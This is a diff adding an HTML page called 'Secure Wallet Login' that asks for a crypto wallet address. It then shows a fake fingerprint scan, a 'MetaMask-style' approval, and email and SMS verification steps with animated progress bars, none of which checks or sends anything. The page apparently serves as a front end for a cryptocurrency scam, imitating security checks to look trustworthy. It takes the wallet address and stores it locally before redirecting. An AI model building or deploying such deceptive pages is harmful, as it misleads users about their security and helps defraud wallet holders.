@@ -1,1 +1,213 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Secure Wallet Login</title>
 
+<style>
+body{margin:0;background:#0b0f14;font-family:system-ui;color:white}
+.center{height:100vh;display:flex;justify-content:center;align-items:center}
+.card{background:#111827;padding:40px;border-radius:18px;width:360px;text-align:center}
+
+input,select{
+width:100%;padding:14px;margin:10px 0;
+background:#0b0f14;border:1px solid #263041;
+border-radius:10px;color:white
+}
+
+button{
+width:100%;padding:15px;margin-top:10px;
+border:none;border-radius:12px;
+background:#22c55e;color:white;font-weight:700;cursor:pointer
+}
+
+.logo{width:160px;margin-bottom:15px}
+
+/* popup */
+
+.pop{
+display:none;position:fixed;inset:0;
+background:rgba(0,0,0,.85);
+justify-content:center;align-items:center
+}
+
+.box{background:#111827;padding:30px;border-radius:16px;width:330px;text-align:center}
+
+.scan{
+width:120px;height:120px;border-radius:50%;
+border:4px solid #22c55e;margin:20px auto;
+animation:scan 2s infinite linear
+}
+@keyframes scan{100%{transform:rotate(360deg)}}
+
+.bar{height:8px;background:#1f2937;border-radius:8px;margin-top:15px}
+.fill{height:100%;width:0;background:#22c55e}
+</style>
+</head>
+
+<body>
+
+<div class="center">
+<div class="card">
+
+<img src="logo.png" class="logo">
+
+<select id="net">
+<option>TRX</option>
+<option>BTC</option>
+<option>ERC</option>
+<option>BNB</option>
+<option>SOL</option>
+</select>
+
+<input id="addr" placeholder="Wallet address">
+
+<button onclick="finger()">Secure Login</button>
+
+</div>
+</div>
+
+
+<!-- fingerprint -->
+
+<div class="pop" id="fingerPop">
+<div class="box">
+<h3>Fingerprint Scan</h3>
+<div class="scan"></div>
+<p>Scanning identity...</p>
+</div>
+</div>
+
+
+<!-- MetaMask-style approval -->
+
+<div class="pop" id="approvePop">
+<div class="box">
+<h3>Wallet Approval</h3>
+<p>Approve secure connection</p>
+<button onclick="emailStep()">Approve</button>
+</div>
+</div>
+
+
+<!-- EMAIL -->
+
+<div class="pop" id="emailPop">
+<div class="box">
+
+<h3>Email Verification</h3>
+
+<div id="email1">
+<input id="email" placeholder="Email">
+<button onclick="sendEmail()">Send Code</button>
+</div>
+
+<div id="emailBarBox" style="display:none">
+<p>Sending encrypted mail…</p>
+<div class="bar"><div class="fill" id="emailBar"></div></div>
+</div>
+
+<div id="email2" style="display:none">
+<input id="ecode" placeholder="Enter code">
+<button onclick="smsStep()">Verify</button>
+</div>
+
+</div>
+</div>
+
+
+<!-- SMS -->
+
+<div class="pop" id="smsPop">
+<div class="box">
+
+<h3>SMS Security Check</h3>
+
+<div id="sms1">
+<input placeholder="+ phone number">
+<button onclick="sendSMS()">Send SMS</button>
+</div>
+
+<div id="smsBarBox" style="display:none">
+<p>Sending secure SMS…</p>
+<div class="bar"><div class="fill" id="smsBar"></div></div>
+</div>
+
+<div id="sms2" style="display:none">
+<input placeholder="Enter SMS code">
+<button onclick="finish()">Confirm</button>
+</div>
+
+</div>
+</div>
+
+
+<script>
+
+function finger(){
+if(addr.value.length<8){alert("Enter wallet");return;}
+fingerPop.style.display="flex";
+
+setTimeout(()=>{
+fingerPop.style.display="none";
+approvePop.style.display="flex";
+},2600);
+}
+
+function emailStep(){
+approvePop.style.display="none";
+emailPop.style.display="flex";
+}
+
+function sendEmail(){
+
+email1.style.display="none";
+emailBarBox.style.display="block";
+
+let p=0;
+let t=setInterval(()=>{
+p+=4;
+emailBar.style.width=p+"%";
+if(p>=100){
+clearInterval(t);
+emailBarBox.style.display="none";
+email2.style.display="block";
+}
+},80);
+}
+
+function smsStep(){
+emailPop.style.display="none";
+smsPop.style.display="flex";
+}
+
+function sendSMS(){
+
+sms1.style.display="none";
+smsBarBox.style.display="block";
+
+let p=0;
+let t=setInterval(()=>{
+p+=5;
+smsBar.style.width=p+"%";
+if(p>=100){
+clearInterval(t);
+smsBarBox.style.display="none";
+sms2.style.display="block";
+}
+},80);
+}
+
+function finish(){
+
+localStorage.wallet=addr.value;
+localStorage.net=net.value;
+
+location="home.html";
+}
+
+</script>
+
+</body>
+  </html>
